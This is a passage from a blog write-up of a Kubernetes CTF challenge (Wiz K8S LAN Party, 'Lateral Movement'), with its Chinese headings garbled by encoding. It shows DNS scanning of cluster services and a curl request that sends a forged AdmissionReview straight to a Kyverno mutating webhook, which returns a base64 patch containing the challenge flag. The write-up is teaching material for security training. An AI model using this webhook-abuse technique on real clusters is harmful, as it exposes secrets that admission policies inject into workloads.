<h4 id="Policy"><a href="#Policy" class="headerlink" title="Policy"></a>Policy</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">apply-flag-to-env</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">sensitive-ns</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">inject-env-vars</span></span><br><span class="line">      <span class="attr">match:</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Pod</span></span><br><span class="line">      <span class="attr">mutate:</span></span><br><span class="line">        <span class="attr">patchStrategicMerge:</span></span><br><span class="line">          <span class="attr">spec:</span></span><br><span class="line">            <span class="attr">containers:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="attr">env:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FLAG</span></span><br><span class="line">                    <span class="attr">value:</span> <span class="string">&quot;&#123;flag&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="è€ƒç‚¹-4"><a href="#è€ƒç‚¹-4" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><ul>
<li>Dynamic Admission Control<ul>
<li><strong>admission webhooks</strong></li>
<li>AdmissionReview</li>
</ul>
</li>
</ul>
<h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ol>
<li>å­¦ä¹ é¢˜ç›®æè¿°å’Œ hint</li>
</ol>
<p><strong><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">Webhook request and response</a></strong></p>
<ul>
<li>webhooks can specify what versions of <code>AdmissionReview</code> objects they accept with the <code>admissionReviewVersions</code> field in their configuration</li>
</ul>
<p>å°±æ˜¯ä¸€å¥—è¯·æ±‚å“åº”ä½“ç³»ã€‚ä¸èƒ½ç›´æ¥å‘è¯·æ±‚ï¼Œéœ€è¦åŠ ä¸Š JSON æ„é€ ä¸€ä¸ªåˆæ³•è¯·æ±‚ã€‚</p>
<blockquote>
<p>When allowing a request, a mutating admission webhook may optionally modify the incoming object as well. This is done using the<code>patch</code> and<code>patchType</code> fields in the response. The only currently supported <code>patchType</code> is <code>JSONPatch</code>.For <code>patchType: JSONPatch</code>, the <code>patch</code>  field contains a base64-encoded array of JSON patch operations.</p>
</blockquote>
<ol>
<li>ä¿¡æ¯æœé›†</li>
</ol>
<p><strong>Service</strong>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kyverno-cleanup-controller.kyverno.svc.cluster.local.</span><br><span class="line">player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16</span><br><span class="line">10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.</span><br><span class="line">10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.</span><br></pre></td></tr></table></figure>

<p>æ²¡æ‡‚å•¥æ„æ€ï¼Œä½†æ˜¯å°±æ˜¯ç›´æ¥è¯·æ±‚ç»™çš„<code>policy</code> è½¬æ¢çš„JSONï¼Œç„¶åå°±è¿”å›patchäº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player@wiz-k8s-lan-party:~$ curl -k -X POST &lt;https://kyverno-svc.kyverno.svc.cluster.local&gt;./mutate -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;apiVersion&quot;:&quot;admission.k8s.io/v1&quot;,&quot;kind&quot;:&quot;AdmissionReview&quot;,&quot;request&quot;:&#123;&quot;uid&quot;:&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;,&quot;kind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;resource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;requestKind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;requestResource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;,&quot;operation&quot;:&quot;CREATE&quot;,&quot;userInfo&quot;:&#123;&quot;username&quot;:&quot;psych&quot;,&quot;uid&quot;:&quot;xxx&quot;,&quot;groups&quot;:[&quot;system:authenticated&quot;]&#125;,&quot;object&quot;:&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;name&quot;:&quot;psych-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;name&quot;:&quot;psych-container&quot;,&quot;image&quot;:&quot;nginx&quot;,&quot;env&quot;:[&#123;&quot;name&quot;:&quot;FLAG&quot;,&quot;value&quot;:&quot;&#123;flag&#125;&quot;&#125;]&#125;]&#125;&#125;,&quot;oldObject&quot;:null,&quot;options&quot;:&#123;&quot;apiVersion&quot;:&quot;meta.k8s.io/v1&quot;,&quot;kind&quot;:&quot;CreateOptions&quot;&#125;,&quot;dryRun&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;AdmissionReview&quot;</span>,<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;admission.k8s.io/v1&quot;</span>,<span class="string">&quot;request&quot;</span>:&#123;<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;</span>,<span class="string">&quot;kind&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>&#125;,<span class="string">&quot;resource&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;resource&quot;</span>:<span class="string">&quot;pods&quot;</span>&#125;,<span class="string">&quot;requestKind&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>&#125;,<span class="string">&quot;requestResource&quot;</span>:&#123;<span class="string">&quot;group&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;resource&quot;</span>:<span class="string">&quot;pods&quot;</span>&#125;,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;example-pod&quot;</span>,<span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;sensitive-ns&quot;</span>,<span class="string">&quot;operation&quot;</span>:<span class="string">&quot;CREATE&quot;</span>,<span class="string">&quot;userInfo&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;psych&quot;</span>,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;groups&quot;</span>:[<span class="string">&quot;system:authenticated&quot;</span>]&#125;,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Pod&quot;</span>,<span class="string">&quot;metadata&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;psych-pod&quot;</span>,<span class="string">&quot;namespace&quot;</span>:<span class="string">&quot;sensitive-ns&quot;</span>&#125;,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;containers&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;psych-container&quot;</span>,<span class="string">&quot;image&quot;</span>:<span class="string">&quot;nginx&quot;</span>,<span class="string">&quot;env&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;FLAG&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;&#123;flag&#125;&quot;</span>&#125;]&#125;]&#125;&#125;,<span class="string">&quot;oldObject&quot;</span>:null,<span class="string">&quot;dryRun&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;options&quot;</span>:&#123;<span class="string">&quot;apiVersion&quot;</span>:<span class="string">&quot;meta.k8s.io/v1&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;CreateOptions&quot;</span>&#125;&#125;,<span class="string">&quot;response&quot;</span>:&#123;<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;2024ee9c-c374-413c-838d-e62bcb4826be&quot;</span>,<span class="string">&quot;allowed&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;patch&quot;</span>:<span class="string">&quot;W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d&quot;</span>,<span class="string">&quot;patchType&quot;</span>:<span class="string">&quot;JSONPatch&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d</code> base64decode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;op&quot;:&quot;replace&quot;,&quot;path&quot;:&quot;/spec/containers/0/env/0/value&quot;,&quot;value&quot;:&quot;wiz_k8s_lan_party&#123;you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory&#125;&quot;&#125;, &#123;&quot;path&quot;:&quot;/metadata/annotations&quot;,&quot;op&quot;:&quot;add&quot;,&quot;value&quot;:&#123;&quot;[policies.kyverno.io/last-applied-patches&quot;:&quot;inject-env-vars.apply-flag-to-env.kyverno.io:](&lt;http://policies.kyverno.io/last-applied-patches%22:%22inject-env-vars.apply-flag-to-env.kyverno.io:&gt;) replaced /spec/containers/0/env/0/value\\n&quot;&#125;&#125;]</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Article</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">åœ°å€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4"><span class="toc-number">1.2.</span> <span class="toc-text">æ—¶é—´</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-1%EF%BC%9ARECON"><span class="toc-number">2.</span> <span class="toc-text">Challenge 1ï¼šRECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text">é™„å½•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-2%EF%BC%9AFINDING-NEIGHBOURS"><span class="toc-number">3.</span> <span class="toc-text">Challenge 2ï¼šFINDING NEIGHBOURS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">3.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.3.</span> <span class="toc-text">åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-3%EF%BC%9ADATA-LEAKAGE"><span class="toc-number">4.</span> <span class="toc-text">Challenge 3ï¼šDATA LEAKAGE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-2"><span class="toc-number">4.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.</span> <span class="toc-text">åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nfs-cat-%E5%92%8C-nfs-ls"><span class="toc-number">4.3.1.</span> <span class="toc-text">nfs-cat å’Œ nfs-ls</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NFS"><span class="toc-number">4.3.2.</span> <span class="toc-text">NFS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-mount"><span class="toc-number">4.3.3.</span> <span class="toc-text">æŸ¥çœ‹ mount</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-flag"><span class="toc-number">4.3.4.</span> <span class="toc-text">å‘ç° flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-4%EF%BC%9ABYPASSING-BOUNDARIES"><span class="toc-number">5.</span> <span class="toc-text">Challenge 4ï¼šBYPASSING BOUNDARIES</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">5.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-3"><span class="toc-number">5.2.</span> <span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">5.3.</span> <span class="toc-text">åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lstio"><span class="toc-number">5.3.1.</span> <span class="toc-text">lstio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iptabl"><span class="toc-number">5.3.2.</span> <span class="toc-text">iptabl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.3.3.</span> <span class="toc-text">ä¿¡æ¯æœé›†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hint-%E5%88%86%E6%9E%90"><span class="toc-number">5.3.4.</span> <span class="toc-text">hint åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.5.</span> <span class="toc-text">éªŒè¯</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge-5%EF%BC%9ALATERAL-MOVEMENT"><span class="toc-number">6.</span> <span class="toc-text">challenge 5ï¼šLATERAL MOVEMENT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">6.1.</span> <span class="toc-text">é¢˜ç›®æè¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Who-will-guard-the-guardians"><span class="toc-number">6.1.1.</span> <span class="toc-text">Who will guard the guardians?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hint"><span class="toc-number">6.1.2.</span> <span class="toc-text">Hint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Policy"><span class="toc-number">6.1.3.</span> <span class="toc-text">Policy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9-4"><span class="toc-number">7.</span> <span class="toc-text">è€ƒç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">7.1.</span> <span class="toc-text">åˆ†æ</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&text=K8S_LAN_PARTY_WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&is_video=false&description=K8S_LAN_PARTY_WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=K8S_LAN_PARTY_WriteUp&body=Check out this article: http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&name=K8S_LAN_PARTY_WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&t=K8S_LAN_PARTY_WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2024
    psych
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Article</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>
    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
